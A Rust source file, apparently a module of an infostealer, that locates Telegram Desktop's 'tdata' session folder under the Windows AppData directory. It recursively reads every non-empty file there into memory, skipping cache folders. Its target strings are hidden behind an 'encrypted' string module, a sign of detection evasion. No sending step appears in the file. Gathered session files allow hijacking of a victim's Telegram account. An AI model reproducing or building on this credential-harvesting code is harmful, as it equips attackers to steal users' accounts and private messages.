use std::path::Path;
use crate::encrypted::*;

fn is_excluded(name: &str) -> bool {
    let excl = [
        s_tg_excl_dumps(),
        s_tg_excl_emoji(),
        s_tg_excl_temp(),
        s_tg_excl_user_data(),
    ];
    if excl.iter().any(|e| e == name) {
        return true;
    }
    let prefix = s_tg_excl_user_data_prefix();
    if let Some(suffix) = name.strip_prefix(prefix.as_str()) {
        if !suffix.is_empty() && suffix.chars().all(|c| c.is_ascii_digit()) {
            return true;
        }
    }
    false
}

pub fn get_telegram_paths() -> Vec<(String, Vec<u8>)> {
    let mut files = Vec::new();

    let roaming = std::env::var(s_appdata()).unwrap_or_default();
    let telegram_path = Path::new(&roaming).join(s_telegram_desktop()).join(s_tdata());

    if !telegram_path.exists() {
        return files;
    }

    collect_files_recursive(&telegram_path, &s_tg_collect_prefix(), &mut files);

    files
}

fn collect_files_recursive(base_path: &Path, current_path: &str, files: &mut Vec<(String, Vec<u8>)>) {
    if let Ok(entries) = std::fs::read_dir(base_path) {
        for entry in entries.flatten() {
            let path = entry.path();
            let name = entry.file_name().to_string_lossy().to_string();

            if is_excluded(&name) {
                continue;
            }

            let full_path = format!("{}/{}", current_path, name);

            if path.is_dir() {
                collect_files_recursive(&path, &full_path, files);
            } else if let Ok(contents) = std::fs::read(&path) {
                if !contents.is_empty() {
                    files.push((full_path, contents));
                }
            }
        }
    }
}
